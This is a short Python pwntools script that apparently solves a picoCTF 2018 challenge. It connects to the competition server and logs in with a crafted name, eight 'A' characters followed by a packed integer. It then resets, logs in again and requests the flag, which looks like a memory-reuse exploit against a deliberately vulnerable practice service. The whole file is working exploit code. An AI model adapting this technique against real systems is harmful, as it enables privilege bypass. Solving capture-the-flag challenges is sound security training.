from pwn import *

r = remote('2018shell1.picoctf.com', 26847)

r.sendlineafter('> ', 'login ' + 'A' * 8 + p32(5))
r.sendlineafter('> ', 'reset')
r.sendlineafter('> ', 'login hoge')

r.sendlineafter('> ', 'get-flag')
print(r.recvline())

r.sendlineafter('> ', 'quit')
